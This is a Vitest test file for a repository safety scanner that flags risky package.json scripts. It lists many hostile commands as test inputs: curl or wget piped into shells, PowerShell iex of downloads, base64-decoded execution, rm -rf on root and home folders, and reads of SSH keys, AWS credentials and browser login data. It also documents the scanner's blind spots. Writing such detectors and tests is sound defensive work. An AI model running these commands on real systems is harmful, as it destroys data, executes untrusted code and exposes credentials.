// Stage 4A rule corpus: positives, benign lookalikes, quoting, nesting,
// Windows and POSIX forms, case, and the documented blind spots.
import { describe, expect, it } from "vitest";
import { checkRepository } from "../../../src/lib/safety/checkRepository";
import type { SafetyRuleId } from "../../../src/lib/safety/types";
import { pkg, scan } from "../insights/builders";

/** The rule ids one script triggers. */
function rulesFor(command: string, { name = "build", path = "package.json" }: { name?: string; path?: string } = {}): SafetyRuleId[] {
  const report = checkRepository(scan({ packages: [pkg(path, { scripts: { [name]: command } })] }));
  if (report.status === "unavailable") throw new Error("unexpected");
  return report.findings.map((f) => f.ruleId);
}
const expectRule = (rule: SafetyRuleId, commands: string[], options?: Parameters<typeof rulesFor>[1]) => {
  for (const c of commands) expect(rulesFor(c, options), c).toContain(rule);
};
const expectNotRule = (rule: SafetyRuleId, commands: string[], options?: Parameters<typeof rulesFor>[1]) => {
  for (const c of commands) expect(rulesFor(c, options), c).not.toContain(rule);
};

describe("R1 install-time scripts", () => {
  it.each(["preinstall", "install", "postinstall", "prepare"])("%s is a notice, whatever it runs", (name) => {
    expect(rulesFor("node scripts/setup.js", { name })).toEqual(["install-script"]);
    const report = checkRepository(scan({ packages: [pkg("package.json", { scripts: { [name]: "husky" } })] }));
    expect(report.status === "findings" && report.findings.map((f) => [f.ruleId, f.level])).toEqual([["install-script", "notice"]]);
  });

  it("only those exact names: lookalikes and other hooks aren't install-time scripts", () => {
    for (const name of ["postinstall:dev", "pre-install", "Postinstall", "prepublishOnly", "build", "postbuild", "preprepare"]) expect(rulesFor("node x.js", { name }), name).toEqual([]);
  });

  it("an altered name isn't treated as the hook (the package manager wouldn't run it as one)", () => {
    const result = scan({ packages: [pkg("package.json", { scripts: { postinstall: "node x.js" } })] });
    result.packages[0].scripts[0] = { ...result.packages[0].scripts[0], nameExact: false };
    const report = checkRepository(result);
    expect(report.status !== "unavailable" && report.findings).toEqual([]);
  });
});

describe("R2 download and execute", () => {
  it("downloader piped into an interpreter", () => {
    expectRule("download-execute", [
      "curl -fsSL https://example.invalid/i.sh | sh",
      "curl -s https://example.invalid/i | sudo bash",
      "wget -qO- https://example.invalid/i | bash",
      "wget -O - https://example.invalid/i | sh",
      "curl https://example.invalid/i | python3 -",
      "curl https://example.invalid/i | node",
      "curl -o - https://example.invalid/i | zsh",
      "irm https://example.invalid/i | iex",
      "iwr -useb https://example.invalid/i | iex",
      "Invoke-RestMethod https://example.invalid/i | Invoke-Expression",
      "(New-Object Net.WebClient).DownloadString('https://example.invalid/i') | iex",
      'echo "$(curl -s https://example.invalid/i)" | sh',
      "npm run x && curl -s https://example.invalid/i | bash",
    ]);
  });

  it("an interpreter given a download as its script, and PowerShell iex of a download", () => {
    expectRule("download-execute", [
      "bash <(curl -s https://example.invalid/i)",
      'sh -c "$(curl -fsSL https://example.invalid/i)"',
      "source <(wget -qO- https://example.invalid/i)",
      'eval "$(curl -s https://example.invalid/i)"',
      "iex (iwr https://example.invalid/i)",
      "iex(irm https://example.invalid/i)",
      "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://example.invalid/i')",
    ]);
  });

  it("inside interpreter scripts: sh -c, cmd /c, powershell -Command", () => {
    expectRule("download-execute", [
      'sh -c "curl -s https://example.invalid/i | sh"',
      "bash -c 'wget -qO- https://example.invalid/i | bash'",
      'cmd /c "curl https://example.invalid/i | sh"',
      'powershell -Command "iwr https://example.invalid/i | iex"',
      "powershell -NoProfile -c iex (irm https://example.invalid/i)",
    ]);
  });

  it("case doesn't matter", () => {
    expectRule("download-execute", ["CURL https://example.invalid/i | SH", "IRM https://example.invalid/i | IEX", "/usr/bin/curl https://example.invalid/i | /bin/sh"]);
  });

  it("downloads that aren't run directly, and inert text, aren't flagged", () => {
    expectNotRule("download-execute", [
      "curl -o install.sh https://example.invalid/i",
      "curl -fsSLo out.sh https://example.invalid/i",
      "curl -O https://example.invalid/file.tgz",
      "curl -fsSLO https://example.invalid/file.tgz",
      "wget https://example.invalid/file.tgz",
      "wget -O out.sh https://example.invalid/i",
      "wget -qO out.sh https://example.invalid/i | tee log",
      "curl https://example.invalid/i | tee log.txt",
      "curl https://example.invalid/i > file.sh",
      "curl -s https://example.invalid/v.json | jq .version",
      "curl -s https://example.invalid/i | grep sh",
      "iwr https://example.invalid/f.zip -OutFile f.zip",
      'echo "curl https://example.invalid/i | sh"',
      "echo 'run: curl https://example.invalid/i | bash'",
      'node -e "console.log(\'curl x | sh\')"',
      "bash ./scripts/setup.sh",
      'sh -c "npm run build"',
      "node scripts/fetch.js && node build.js",
      "shx cat https://example.invalid | sh",
    ]);
  });

  // Codex P2 #1: the piped program must run its input as code, by its own rules.
  it("a named script file runs that file: the download is only its input", () => {
    expectNotRule("download-execute", [
      "curl https://example.invalid/data | node scripts/check-response.js",
      "curl https://example.invalid/data | node --max-old-space-size=4096 scripts/check.js",
      "curl https://example.invalid/data | python process.py",
      "curl https://example.invalid/data | python3 -u tools/parse.py --strict",
      "curl https://example.invalid/data | bash ./scripts/handle.sh",
      "curl https://example.invalid/data | sh tools/consume.sh arg",
      "curl https://example.invalid/data | perl filter.pl",
      "curl https://example.invalid/data | ruby parse.rb",
      "curl https://example.invalid/data | powershell -File parse.ps1",
      "curl https://example.invalid/data | pwsh ./parse.ps1",
      "curl https://example.invalid/data | source ./env.sh",
    ]);
  });

  it("a program given on the command line runs that program, not its input", () => {
    expectNotRule("download-execute", [
      "curl https://example.invalid/data | node -e \"process.stdin.pipe(process.stdout)\"",
      "curl https://example.invalid/data | node --eval=x",
      "curl https://example.invalid/data | node -p 1",
      "curl https://example.invalid/data | python -c \"import sys; print(sys.stdin.read())\"",
      "curl https://example.invalid/data | python -m json.tool",
      "curl https://example.invalid/data | sh -c \"cat > out.txt\"",
      "curl https://example.invalid/data | bash -ec 'wc -c'",
      "curl https://example.invalid/data | perl -ne print",
      "curl https://example.invalid/data | ruby -e 'puts 1'",
      "curl https://example.invalid/data | powershell -Command Get-Date",
      "curl https://example.invalid/data | iex $other",
    ]);
  });

  it("eval ignores piped input: not a pipe destination", () => {
    expectNotRule("download-execute", ["curl https://example.invalid/i | eval", "curl https://example.invalid/i | eval echo hi"]);
  });

  it("explicit stdin execution is still detected", () => {
    expectRule("download-execute", [
      "curl https://example.invalid/i | node -",
      "curl https://example.invalid/i | node /dev/stdin",
      "curl https://example.invalid/i | python -",
      "curl https://example.invalid/i | python3 - --flag",
      "curl https://example.invalid/i | bash -s -- --install",
      "curl https://example.invalid/i | sh -s",
      "curl https://example.invalid/i | bash -",
      "curl https://example.invalid/i | sh -x",
      "curl https://example.invalid/i | bash --login",
      "curl https://example.invalid/i | bash /dev/stdin",
      "curl https://example.invalid/i | perl -",
      "curl https://example.invalid/i | ruby",
      "curl https://example.invalid/i | powershell -Command -",
      "curl https://example.invalid/i | powershell -NoProfile -ExecutionPolicy Bypass -File -",
      "curl https://example.invalid/i | pwsh -NoProfile",
      "curl https://example.invalid/i | source /dev/stdin",
      "irm https://example.invalid/i | iex",
      'sh -c "curl -s https://example.invalid/i | bash -s"',
    ]);
  });

  it("ambiguous option values count as a script name: no claim is made", () => {
    expectNotRule("download-execute", ["curl https://example.invalid/i | bash -o pipefail", "curl https://example.invalid/i | node --require ./hook.js"]);
  });

  // Codex P2 #2: wget saves to a file unless told to write to stdout.
  it("wget's default and named output files aren't direct execution", () => {
    expectNotRule("download-execute", [
      "wget https://example.invalid/i | sh",
      "wget -q https://example.invalid/i | bash",
      "wget -O install.sh https://example.invalid/i | sh",
      "wget -qOinstall.sh https://example.invalid/i | sh",
      "wget --output-document=install.sh https://example.invalid/i | sh",
      "wget -o - https://example.invalid/i | sh", // -o is wget's log, not the download
      "wget -O - -O saved.sh https://example.invalid/i | sh", // the last -O wins
    ]);
  });

  it("wget writing the download to stdout, then run, is detected", () => {
    expectRule("download-execute", [
      "wget -qO- https://example.invalid/i | sh",
      "wget -qO - https://example.invalid/i | sh",
      "wget -O- https://example.invalid/i | bash",
      "wget -O - https://example.invalid/i | bash",
      "wget --output-document=- https://example.invalid/i | sh",
      "wget --output-document - https://example.invalid/i | sh",
      "wget -O /dev/stdout https://example.invalid/i | sh",
      "wget -q -O saved.sh -O - https://example.invalid/i | sh",
      'bash -c "$(wget -qO- https://example.invalid/i)"',
      "source <(wget -qO- https://example.invalid/i)",
    ]);
    // Without stdout output, a substitution gets wget's (empty) stdout, not the download.
    expectNotRule("download-execute", ['bash -c "$(wget https://example.invalid/i)"']);
  });

  it("documented blind spot: download to a file, then run it", () => {
    expectNotRule("download-execute", ["curl -o setup.sh https://example.invalid/i && sh setup.sh"]);
  });
});

describe("R3 encoded or hidden execution", () => {
  it("PowerShell encoded commands", () => {
    expectRule("encoded-execution", [
      "powershell -EncodedCommand SQBFAFgA",
      "powershell.exe -enc SQBFAFgA",
      "PowerShell -ENC SQBFAFgA",
      "pwsh -ec SQBFAFgA",
      "powershell /enc SQBFAFgA",
      "powershell -NoP -W Hidden -e SQBFAFgAIAAoAGkAdwByACAAeAApAA==",
      "powershell -encodedc SQBFAFgA",
    ]);
  });

  it("base64 decoding run by an interpreter or eval", () => {
    expectRule("encoded-execution", [
      "echo SGVsbG8= | base64 -d | sh",
      "base64 --decode payload.txt | bash",
      "cat x | base64 -D | zsh",
      "cat x | openssl base64 -d | sh",
      'bash -c "$(echo SGVsbG8= | base64 -d)"',
      'sh -c "echo SGVsbG8= | base64 -d | sh"',
      'node -e "eval(Buffer.from(\'aGk=\',\'base64\').toString())"',
      'python -c "import base64;exec(base64.b64decode(\'aGk=\'))"',
      'python3 -c "import base64;eval(base64.b64decode(\'aGk=\'))"',
    ]);
  });

  it("eval of a command substitution (by design, even for common tools)", () => {
    expectRule("encoded-execution", ['eval "$(fnm env)"', "eval `ssh-agent -s`", "eval $(./configure.sh)"]);
  });

  it("the shared rule: decoding into a named script or eval isn't execution; into stdin execution it is", () => {
    expectNotRule("encoded-execution", [
      "echo SGVsbG8= | base64 -d | node scripts/decode.js",
      "echo SGVsbG8= | base64 -d | python handle.py",
      "echo SGVsbG8= | base64 -d | bash ./consume.sh",
      "echo SGVsbG8= | base64 -d | eval",
      "echo SGVsbG8= | base64 -d | sh -c 'cat > out'",
    ]);
    expectRule("encoded-execution", ["echo SGVsbG8= | base64 -d | node -", "echo SGVsbG8= | base64 -d | bash -s", "echo SGVsbG8= | base64 -d | python3 -", "echo SGVsbG8= | base64 -d | pwsh -c -"]);
  });

  it("lookalikes aren't flagged", () => {
    expectNotRule("encoded-execution", [
      "powershell -ExecutionPolicy Bypass -File build.ps1",
      "powershell -e short",
      "powershell -NoProfile -File x.ps1 -Environment production",
      "echo SGVsbG8= | base64 -d > out.txt",
      "base64 -d in.b64 > out.bin",
      "base64 file.txt | sh",
      'echo "eval $(date)"',
      "eval echo hi",
      "echo QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0123456789=",
      'node -e "console.log(Buffer.from(\'aGk=\',\'base64\'))"',
      'python -c "import base64;print(base64.b64decode(\'aGk=\'))"',
      'echo "powershell -enc X"',
    ]);
  });
});

describe("R4 destructive commands outside the project", () => {
  it("roots, homes and system folders, POSIX and Windows", () => {
    expectRule("destructive-outside-project", [
      "rm -rf /",
      "rm -rf /*",
      "rm -rf ~",
      "rm -rf ~/",
      "rm -rf $HOME",
      'rm -rf "$HOME"',
      "rm -fr ~/Documents",
      "rm -Rf ${HOME}/x",
      "sudo rm -rf /etc/nginx",
      "rm --recursive --force /usr/local",
      "rimraf ~/.cache/tool",
      "del /s /q C:\\",
      "del /S /Q C:\\*",
      "rd /s /q %USERPROFILE%",
      "rmdir /S /Q C:\\Windows\\Temp",
      "Remove-Item -Recurse -Force $env:USERPROFILE\\Documents",
      "ri -Recurse C:\\Users\\someone",
      "RM -RF /",
      'sh -c "rm -rf ~"',
      "npm run clean && rm -rf $HOME/.config",
    ]);
  });

  it("relative parents only when they clearly leave the analyzed folder", () => {
    expectRule("destructive-outside-project", ["rm -rf ..", "rm -rf ../dist", "rimraf ../../x"]); // root package: depth 0
    expectRule("destructive-outside-project", ["rm -rf ../../../x"], { path: "apps/web/package.json" }); // depth 2
    expectNotRule("destructive-outside-project", ["rm -rf ../shared", "rm -rf ../../dist", "rimraf ../../node_modules/.cache"], { path: "apps/web/package.json" });
    // After a directory change the starting folder is unknown: not asserted.
    expectNotRule("destructive-outside-project", ["cd .. && rm -rf ../dist", "cd packages/x && rimraf ../../.."]);
  });

  it("routine project cleanup isn't flagged", () => {
    expectNotRule("destructive-outside-project", [
      "rm -rf dist",
      "rm -rf build node_modules",
      "rm -rf ./coverage",
      "rm -rf *",
      'rm -rf "$OUT_DIR"',
      "rimraf dist",
      "rimraf ./build",
      "rimraf --glob 'dist/**'",
      "del /s /q dist",
      "rd /s /q build",
      "Remove-Item -Recurse -Force dist",
      "shx rm -rf dist",
      "del-cli dist",
      "rm -f ~/x.log",
      "Remove-Item -Force ~/x.log",
      "rm ~/.cache/file",
      'echo "rm -rf /"',
    ]);
  });

  it("documented blind spots: other absolute paths and variables", () => {
    expectNotRule("destructive-outside-project", ["rm -rf /tmp/build-cache", "rm -rf D:\\data", "rm -rf $TARGET"]);
  });
});

describe("R5 credential locations", () => {
  it("narrow literal references", () => {
    expectRule("credential-path", [
      "cat ~/.ssh/id_rsa",
      "cp $HOME/.ssh/config x",
      "scp -i ~/.ssh/id_ed25519 a b",
      "cat /home/dev/.ssh/known_hosts",
      "ssh-add id_rsa",
      "cat ~/.aws/credentials",
      "type %USERPROFILE%\\.aws\\credentials",
      "cat ~/.git-credentials",
      "cat ~/.npmrc",
      "cp ~/.config/gcloud/credentials.db x",
      'copy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data" x',
      "ls ~/.mozilla/firefox",
      "TYPE %USERPROFILE%\\.SSH\\ID_RSA",
    ]);
  });

  it("a mention inside quotes is still a reference (reported as a reference, not proof)", () => {
    expectRule("credential-path", ['echo "~/.ssh"']);
  });

  it("environment variables, project files and public keys aren't flagged", () => {
    expectNotRule("credential-path", [
      "npm config set //registry.npmjs.org/:_authToken=$NPM_TOKEN",
      "echo $NPM_TOKEN",
      "cp .npmrc dist/",
      "cat .npmrc",
      "cat keys/id_rsa.pub",
      "cat ~/.aws/config",
      "aws s3 cp x s3://bucket",
      "git config credential.helper store",
      "cat .ssh-keys.txt",
      "echo ssh",
    ]);
  });
});

describe("benign corpus: no warnings or cautions", () => {
  const BENIGN: Record<string, string> = {
    prepare: "husky",
    "prepare:old": "husky install",
    postinstall: "prisma generate",
    install: "node-gyp rebuild",
    preinstall: "npx only-allow pnpm",
    clean: "rimraf dist",
    fetch: "curl -o data.json https://example.invalid/data.json",
    build: "tsc -b && vite build",
    next: "next build",
    lint: "eslint . --fix",
    test: "jest --coverage",
    prod: "cross-env NODE_ENV=production webpack",
    patch: "patch-package",
    deps: "electron-builder install-app-deps",
    shx: "shx rm -rf dist",
    del: "del-cli dist",
    ws: "npm run build --workspaces",
    turbo: "turbo run build",
    docker: "docker compose up",
    hooks: "git config core.hooksPath .githooks",
    native: "prebuild-install || node-gyp rebuild",
    oc: "opencollective-postinstall || true",
    pw: "playwright install --with-deps",
    cy: "cypress install",
    quoted: 'echo "curl https://example.invalid/i | sh"',
    ps: "powershell -ExecutionPolicy Bypass -File scripts/build.ps1",
    win: "if exist dist rd /s /q dist",
  };

  it("only install-time notices; nothing at caution or warning", () => {
    const report = checkRepository(scan({ packages: [pkg("package.json", { scripts: BENIGN })] }));
    if (report.status === "unavailable") throw new Error("unexpected");
    expect(report.findings.filter((f) => f.level !== "notice")).toEqual([]);
    expect(report.findings.map((f) => f.scriptName).sort()).toEqual(["install", "postinstall", "preinstall", "prepare"]);
  });
});

describe("findings per script and package", () => {
  it("several rules in one script each produce one finding, in rule order", () => {
    expect(rulesFor("curl -s https://example.invalid/i | sh && rm -rf ~ && cat ~/.ssh/id_rsa", { name: "postinstall" })).toEqual(["install-script", "download-execute", "destructive-outside-project", "credential-path"]);
  });

  it("the same rule twice in one script is one finding", () => {
    expect(rulesFor("curl https://a.invalid | sh; wget -qO- https://b.invalid | bash; irm https://c.invalid | iex")).toEqual(["download-execute"]);
  });

  it("several packages with the same pattern: one finding each, with their locations", () => {
    const report = checkRepository(scan({
      packages: [
        pkg("package.json", { scripts: { setup: "curl https://x.invalid | sh" } }),
        pkg("apps/web/package.json", { scripts: { setup: "curl https://x.invalid | sh" } }),
        pkg("tools/cli/package.json", { scripts: { other: "rimraf dist" } }),
      ],
    }));
    if (report.status === "unavailable") throw new Error("unexpected");
    expect(report.findings.map((f) => [f.packagePath, f.scriptName, f.ruleId])).toEqual([
      ["package.json", "setup", "download-execute"],
      ["apps/web/package.json", "setup", "download-execute"],
    ]);
  });
});
